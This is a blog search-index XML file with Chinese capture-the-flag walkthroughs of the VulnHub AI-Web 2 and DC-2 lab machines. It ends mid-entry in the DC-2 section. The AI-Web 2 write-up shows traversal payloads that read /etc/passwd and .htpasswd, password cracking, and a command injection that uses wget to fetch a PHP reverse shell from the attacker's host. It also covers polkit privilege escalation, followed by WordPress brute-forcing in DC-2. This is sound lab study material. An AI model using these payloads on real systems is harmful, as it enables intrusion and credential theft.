<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>AI-Web2</title>
    <link href="/2023/10/18/AI-Web2/"/>
    <url>/2023/10/18/AI-Web2/</url>
    
    <content type="html"><![CDATA[<h1 id="AI-web-：2"><a href="#AI-web-：2" class="headerlink" title="AI web ：2"></a>AI web ：2</h1><h2 id="一、环境搭建："><a href="#一、环境搭建：" class="headerlink" title="一、环境搭建："></a>一、环境搭建：</h2><p>下载目标AI <a href="https://www.vulnhub.com/entry/ai-web-2,357/">web2</a>，使用vm打开vmx文件，并设置网络模式为nat模式</p><p>攻击机kali：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>：<span class="hljs-number">192.168.190.130</span> <br></code></pre></td></tr></table></figure><p>目标靶机：AI-Web 2</p><h2 id="二、渗透过程："><a href="#二、渗透过程：" class="headerlink" title="二、渗透过程："></a>二、渗透过程：</h2><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><p>使用nmap工具扫描同一网段存活的主机（获得目标靶机的ip）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn <span class="hljs-number">192.168.190.1</span>/<span class="hljs-number">24</span> -sn对该网络中所有主机进行ping扫描，以探测主机存活性，找到目标靶机ip为<span class="hljs-number">192.168.190.194</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016204913047.png" alt="image-20231016204913047"></p><p>使用nmap扫描目标靶机所开放的端口以及服务：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmap -sS -A -p- <span class="hljs-number">192.168</span>.<span class="hljs-number">190.194</span>    <span class="hljs-regexp">//</span>-sS使用半连接扫描速度快且安全，—A扫描全面，-p-扫描所有端口<br>                   <span class="hljs-regexp">//</span>可以看到目标靶机开放了<span class="hljs-number">22</span>端口（ssh）和<span class="hljs-number">80</span>端口（http）<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016205130453.png" alt="image-20231016205130453"></p><p>尝试访问80端口看能获得什么信息：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">默认页面是一个登录页面，且只需要用户名就能登陆，尝试<span class="hljs-literal">admin</span>不行，点击singup<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016210750013.png" alt="image-20231016210750013"></p><p>在singup页面</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">注册一个<span class="hljs-literal">admin</span>后，回到登陆页面发现可以使用<span class="hljs-literal">admin</span>登陆<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016211005371.png" alt="image-20231016211005371"></p><p>进入该页面后页面没有点击效果，只有logout可以点击：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">打开开发者页面，发现有一个被注释掉的文件上传的的<span class="hljs-selector-tag">html</span>代码，可能是当前用户权限不够，尝试进行爆破，找出可以用的用户名,进行爆破似乎没有作用<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016211231892.png" alt="image-20231016211231892"></p><p>尝试使用目录扫描看能否获得有用信息:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.194</span>     <span class="hljs-regexp">//</span>扫描<span class="hljs-number">80</span>端口目录，没扫找到有用的信息 黄色的目录条webadmin是基于apache开发的，需要账号和密码才能登录，当前先掠过<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016214812293.png" alt="image-20231016214812293"></p><p>使用漏洞扫描工具gvm扫描该网站：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">可惜没有扫到可以利用的漏洞<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016214722458.png" alt="image-20231016214722458"></p><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>在寻找信息中发现xuezhuli filesharing是一个github上的一个项目：</p><p><img src="/2023/10/18/AI-Web2/image-20231016215346297.png" alt="image-20231016215346297"></p><p>可以看到该网站的源代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">我们现在可以通过分析源代码找到利用点<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016215734516.png" alt="image-20231016215734516"></p><p>在userpage.php页面找到了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">              <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;a href=&#x27;download.php?file_name=<span class="hljs-variable">$file</span>&#x27;</span><br><span class="hljs-string">echo &quot;</span>&lt;td&gt;&lt;a href=<span class="hljs-string">&#x27;viewing.php?file_name=$file&#x27;</span> <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;a href=&#x27;deleting.php?file_name=<span class="hljs-variable">$file</span>&#x27; //这些隐藏页面以及file_name参数是之前没有找到的，尝试访问该页面</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016222144369.png" alt="image-20231016222144369"></p><p>当访问download.php页面时，会自动下载文件，且该文件是空的，加上变量名和参数尝试其他下载：</p><p><img src="/2023/10/18/AI-Web2/image-20231016222545784.png" alt="image-20231016222545784"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.190.194</span>/download.php?file_name=/     //发现可以访问<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016222652695.png" alt="image-20231016222652695"></p><p>尝试访问viewing.php看能否读取文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.194</span><span class="hljs-regexp">/viewing.php?file_name=/</span>etc<span class="hljs-regexp">/passwd  直接访问/</span>etc/passwd文件不能访问<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016222928493.png" alt="image-20231016222928493"></p><p>在使用相对路径尝试访问&#x2F;etc&#x2F;passwd时，访问成功：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.194</span><span class="hljs-regexp">/viewing.php?file_name=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd   <span class="hljs-regexp">//</span>在访问过程中且必须有一个用户处于登陆状态=才行，否则会爆出Illegal access!  <br><span class="hljs-regexp">//</span>得到两个home目录下用户名称：aiweb2   和  n0nr00tuser<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017140621597.png" alt="image-20231017140621597"></p><p>同时download.php可以下载相对路径的文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.194</span><span class="hljs-regexp">/download.php?file_name=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231016225555485.png" alt="image-20231016225555485"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">综上，该网站存在目录遍历（文件读取）和文件下载漏洞，可以通过文件目录遍历或者（文件下载）来获取想要的信息<br></code></pre></td></tr></table></figure><p>通过读取apache默认配置文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.194</span><span class="hljs-regexp">/viewing.php?file_name=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>apache2<span class="hljs-regexp">/sites-enabled/</span><span class="hljs-number">000</span>-default.conf<br><span class="hljs-regexp">//</span>通过访问配置文件的到了webadmin用户的凭据存储的文件<span class="hljs-regexp">/etc/</span>apache2/.htpasswd<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017141537149.png" alt="image-20231017141537149"></p><p>访问该用户凭据路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.194</span><span class="hljs-regexp">/viewing.php?file_name=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>apache2/.htpasswd<br><span class="hljs-regexp">//</span>得到了一个hash加密的密码，尝试对其进行解密<br></code></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">aiweb2admin:<span class="hljs-symbol">$apr</span>1<span class="hljs-symbol">$V</span>XqmVvDD<span class="hljs-symbol">$otU</span>1gx4nwCgsAOA7Wi.aU/<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017141924674.png" alt="image-20231017141924674"></p><p>进入kali使用john工具对该密码进行解密：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john <span class="hljs-number">1</span>.txt --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt  <span class="hljs-regexp">//</span>解出得用户：aiweb2admin 密码：c.ronaldo<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017142749581.png" alt="image-20231017142749581"></p><p>使用此凭据去登录webadmin页面：</p><p><img src="/2023/10/18/AI-Web2/image-20231017144647094.png" alt="image-20231017144647094"></p><p>尝试使用readme.txt和robots.txt看能否获得什么信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">得到如下两个目录<br><span class="hljs-regexp">/H05Tpin9555/</span><br><span class="hljs-regexp">/S0mextras/</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017144946317.png" alt="image-20231017144946317"></p><p>第一个是&#x2F;S0mextras&#x2F;说该目录下存在信息</p><p><img src="/2023/10/18/AI-Web2/image-20231017154752849.png" alt="image-20231017154752849"></p><p>在&#x2F;H05Tpin9555&#x2F;的目录下存在一个ping命令执行框，出现在这里非常有可能存在rce漏洞</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">尝试使用特殊符号来进行利用：<br><span class="hljs-number">127.0.0.1</span>|ls /     //可以看到可以执行，说明存在远程命令执行漏洞，现在我们最缺的就是webshell，想办法反弹一个webshell<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017150505000.png" alt="image-20231017150505000"></p><p>尝试将反弹shell脚本下载到靶机：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">kali</span>自带的有webshell的php文件，将里面的<span class="hljs-built_in">ip</span> <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> 改成kali的<span class="hljs-built_in">ip</span> 端口可以改成任意<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017173408280.png" alt="image-20231017173408280"></p><p>kali机开启www服务：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">6060</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017151435822.png" alt="image-20231017151435822"></p><p>在命令框中执行如下命令:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> || wget http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">190</span>.<span class="hljs-number">130</span>:<span class="hljs-number">8080</span>/shell.php   //可以看到文件已经下载成功了<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017151616494.png" alt="image-20231017151616494"></p><p>通过ls命令查看，发现</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">|| ls    <span class="hljs-regexp">//</span>文件已经上传成功了 访问该目录下shell.php文件（先kali进行nc监听）<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017173558386.png" alt="image-20231017173558386"></p><p>kali机进行nc监听：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvnp <span class="hljs-number">6666</span>   <span class="hljs-regexp">//</span>可以看到反弹shell已经成功<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017173806714.png" alt="image-20231017173806714"></p><p>先看目标靶机是否有python环境，如果有则使用python来建立交互式终端：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">which python<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>   <span class="hljs-regexp">//</span>先看看刚才<span class="hljs-regexp">/S0mextras/</span>下存在的有趣的信息<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017173925689.png" alt="image-20231017173925689"></p><p>进入刚才的目录：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">通过 <span class="hljs-keyword">ls</span> -la 命令找到了隐藏文件 <span class="hljs-string">.sshUserCred55512.txt</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017174133682.png" alt="image-20231017174133682"></p><p>查看该文件信息：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">User:</span> n0nr00tuser<br><span class="hljs-symbol">Cred:</span> zxowieoi4sdsadpEClDws1sf        <span class="hljs-comment">//得到n0nr00tuser 用户的密码zxowieoi4sdsadpEClDws1sf，待会可以尝试22端口开放的ssh登录或者su切换到该用户</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017174237244.png" alt="image-20231017174237244"></p><p>查看定时任务：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">crontab -l <span class="hljs-regexp">//</span>利用定时任务提权也是一种方法，可惜两个用户都没有定时任务，且suid权限的定时任务也没有<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017234530338.png" alt="image-20231017234530338"></p><p>查看linux内核版本：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span> -a  //可以看到linux内核版本是<span class="hljs-number">4</span>.<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231018102526176.png" alt="image-20231018102526176"></p><p><img src="/2023/10/18/AI-Web2/image-20231018103831222.png" alt="image-20231018103831222"></p><p>在kali上搜索linux 4.15漏洞：</p><p>执行内核提权失败</p><p><img src="/2023/10/18/AI-Web2/image-20231018103744747.png" alt="image-20231018103744747"></p><h3 id="权限提升1（√）："><a href="#权限提升1（√）：" class="headerlink" title="权限提升1（√）："></a>权限提升1（√）：</h3><h4 id="polkit提权："><a href="#polkit提权：" class="headerlink" title="polkit提权："></a>polkit提权：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">polkit提权介绍网址： https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/csd_ct/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">122757407</span>   <span class="hljs-regexp">//</span>在 polkit 的 pkexec 程序中发现了一个本地权限提升漏洞。pkexec 应用程序是一个 setuid 工具，旨在允许非特权用户根据预定义的策略以特权用户身份运行命令。由于当前版本的 pkexec 无法正确处理调用参数计数，并最终会尝试将环境变量作为命令执行。攻击者可以通过控制环境变量，从而诱导 pkexec 执行任意代码。利用成功后，可导致非特权用户获得管理员权限<br></code></pre></td></tr></table></figure><p>当前用户是www-data用户，所以sudo -l使用不了，先通过find命令来查找具有suid权限的命令：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -perm <span class="hljs-number">-4000</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br><span class="hljs-comment">//发现了polkit命令具有suid权限，查看目标靶机操作系统版本</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017211642018.png" alt="image-20231017211642018"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">可以看到目标靶机的操作系统为Ubuntu 且版本为18.04在漏洞版本存在影响范围之内<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017175228036.png" alt="image-20231017175228036"></p><p>通过wget下载kali机上的polkit提权脚本：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">8080</span> <br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017210741725.png" alt="image-20231017210741725"></p><p>polkit提权条件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">①靶机使用相对应的Ubuntu <span class="hljs-number">18.04</span>.<span class="hljs-number">3</span> 在polkit提权范围内；<br>②：靶机上suid内有polkit相关命令<br>③：使用<span class="hljs-built_in">ps</span><span class="hljs-literal">-ef</span> 可以找到polkit相关进程处于运行状态<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017211610442.png" alt="image-20231017211610442"></p><p>靶机使用wget命令下载该文件授权并执行：</p><p><img src="/2023/10/18/AI-Web2/image-20231017210919413.png" alt="image-20231017210919413"></p><p><img src="/2023/10/18/AI-Web2/image-20231017205754567.png" alt="image-20231017205754567"></p><h3 id="权限提升2（X）-："><a href="#权限提升2（X）-：" class="headerlink" title="权限提升2（X）.："></a>权限提升2（X）.：</h3><h4 id="lxd提权："><a href="#lxd提权：" class="headerlink" title="lxd提权："></a>lxd提权：</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">网上的<span class="hljs-keyword">wp</span>提权是成功的，但我的可能是因为kali环境的问题，没有正常的操作流程<br></code></pre></td></tr></table></figure><p>切换到n0nr00tuser用户：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">发现该用户lxd的权限非常高<br><span class="hljs-regexp">//</span>LXD是一个root进程，它可以负责执行任意用户的LXD UNIX套接字写入访问操作。<br>总之原理就是==就是用用户创建一个容器（具有root权限）,再用容器挂载宿主机的磁盘,然后用容器的权限去操作宿主机磁盘内容（创建一个新的shell）从而达到提权=<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017225126114.png" alt="image-20231017225126114"></p><p>kali机搜索lxd漏洞：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">刚好靶机的<span class="hljs-built_in">os</span>也是ubuntu <span class="hljs-number">18.04</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017225404666.png" alt="image-20231017225404666"></p><p>查看该脚本代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">可以看到该脚本的利用有四步：<br>①：下载一个文件<br>②：运行该文件，会生成一个文件<br>③：将生成的文件和脚本文件一起一起上传到靶场，然后执行脚本文件即可<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/AI-Web2/image-20231017230247897.png" alt="image-20231017230247897"></p><p>下载build-alpine后使用bash运行，不成功，应该是我bash版本的问题，尝试其他提权：</p><p><img src="/2023/10/18/AI-Web2/image-20231017233323831.png" alt="image-20231017233323831"></p><p><img src="/2023/10/18/AI-Web2/image-20231017232901087.png" alt="image-20231017232901087"></p><h2 id="三、打靶总结："><a href="#三、打靶总结：" class="headerlink" title="三、打靶总结："></a>三、打靶总结：</h2><p>①：信息搜集非常重要，找到XuezhuLi这个项目文件就能找到目录遍历和文件下载漏洞，通过利用该漏洞能得到一些关键信息weadmin的账户密码</p><p>②：远程命令执行漏洞通过拼接符（&amp;&amp; ; | ||）进行反弹shell，获得webshell</p><p>③：通过uname -a 或者find 命令等待，找到可以利用的漏洞然后进行提权</p><p>新的参考：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Lonelyhat/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">119512839</span>   <span class="hljs-regexp">//</span>他找到了一个密码凭证来登录<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2023/10/15/DC-2/"/>
    <url>/2023/10/15/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2:"></a>DC-2:</h1><h2 id="一、环境搭建："><a href="#一、环境搭建：" class="headerlink" title="一、环境搭建："></a>一、环境搭建：</h2><p>下载DC-2镜像，得到ova镜像文件，使用vm打开文件设置网络模式为nat</p><p>攻击机kali：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ip</span> <span class="hljs-number">192.168.190.130</span><br></code></pre></td></tr></table></figure><p>目标靶机DC-2</p><h2 id="二、渗透过程："><a href="#二、渗透过程：" class="headerlink" title="二、渗透过程："></a>二、渗透过程：</h2><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><p>使用netdiscover来扫描同一网段存活主机：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netdiscover</span> -r <span class="hljs-number">192.168.190.0</span>/<span class="hljs-number">24</span> <br>//<span class="hljs-number">192.168.190.190</span>是目标靶机<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013093616887.png" alt="image-20231013093616887"></p><p>nmap 扫描目标靶机开放的端口：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmap -A -p- <span class="hljs-number">192.168</span>.<span class="hljs-number">190.190</span><br><span class="hljs-regexp">//</span><span class="hljs-number">80</span>端口的服务没有重定向到,访问<span class="hljs-number">80</span>服务会进不去，需要我们问修改hosts文件<br>修改kali是在<span class="hljs-regexp">/etc/</span>hosts<br>修改windows是在C:\Windows\System32\drivers\etc\hosts<br>添加：<span class="hljs-number">192.168</span>.<span class="hljs-number">190.190</span>  dc-<span class="hljs-number">2</span>    保存即可<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013094048564.png" alt="image-20231013094048564"></p><p>修改成功后访问80端口：</p><h4 id="flag1："><a href="#flag1：" class="headerlink" title="flag1："></a>flag1：</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">在<span class="hljs-built_in">flag</span>标签中发现flag1，同时给我们了提示，说密码越多越好，说明我们需要一个大的密码字典用来爆破，登录的话，应该是由两个账户，其中一个找不到下一个<span class="hljs-built_in">flag</span>，在此页面中没有找到其他有用的信息了<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013102904795.png" alt="image-20231013102904795"></p><p>扫描靶机目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u <span class="hljs-number">192.168</span>.<span class="hljs-number">190.190</span> <span class="hljs-regexp">//</span>在wp-admin扫描到了登录页面，通过这些目录名称我们可以判断出，该网站很有可能用的是wordpress框架<br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013104805875.png" alt="image-20231013104805875"></p><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><h4 id="wordpress框架漏洞利用："><a href="#wordpress框架漏洞利用：" class="headerlink" title="wordpress框架漏洞利用："></a>wordpress框架漏洞利用：</h4><p>whatweb扫描该网站：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">whatweb</span> <span class="hljs-number">192.168.190.190</span> 扫描该网站的信息，可以看到apache的版本是<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">10</span>，采用的框架为wordpress版本为<span class="hljs-number">4</span>.<span class="hljs-number">7</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013112402924.png" alt="image-20231013112402924"></p><p>确定有wordpress后，使用<a href="https://zhuanlan.zhihu.com/p/149725645">wpscan</a>工具：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wpscan工具是针对wordpress框架的一种漏洞扫描工具我们在面对wordpress框架的网站时使用wpscan会提高效率<br>wpscan <span class="hljs-params">--url</span>  http:<span class="hljs-string">//dc-2/</span> -enumerate u     <span class="hljs-string">//</span>  使用wpscan对该网站进行扫描，-enumerate进行枚举 u是用户名<br><span class="hljs-string">//</span>得到三个用户名 admin jerry tom <br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013173137995.png" alt="image-20231013173137995"></p><p>使用wpscan 将用户密码枚举出来:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span><span class="hljs-regexp">/ -P /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/rockyou.txt --usernames admin,jerry,tom  /</span><span class="hljs-regexp">/结果显然而知，非常慢，且没见到效果，这就是字典爆破的难题，没有一个合适的字典————众所周知，wordpress是一个网站残留信息最多的网站所以我们可以使用cewl工具来搜集信息制作字典,</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013181222406.png" alt="image-20231013181222406"></p><h4 id="cewl搜集网站信息制作字典："><a href="#cewl搜集网站信息制作字典：" class="headerlink" title="cewl搜集网站信息制作字典："></a>cewl搜集网站信息制作字典：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cewl http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span><span class="hljs-regexp">/ -w wp-dict.txt  -v   /</span><span class="hljs-regexp">/-w 参数保存输出结果，保存到wp-dict.txt -v 显示详细信息</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/15/DC-2/image-20231013182338712.png" 